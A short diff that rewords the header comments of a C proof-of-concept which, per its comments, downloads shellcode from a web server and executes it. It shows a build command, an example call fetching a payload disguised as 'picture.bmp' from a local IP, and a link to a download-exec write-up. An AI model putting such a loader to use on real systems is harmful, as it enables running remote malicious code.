@@ -1,7 +1,6 @@
 // simple ex for downloading and executing shellcode with sockets from webserver
-// for raw format
 // wine gcc -s -m32 downloadshellcodebin.c -lwsock32 -lWs2_32
-// call with (example) a.exe http://192.168.2.103/picture.bmp
+// example call: a.exe http://192.168.2.103/picture.bmp
 // https://govolution.wordpress.com/2018/03/02/download-exec-poc-and-dkmc/
 
 #include "WinSock2.h"
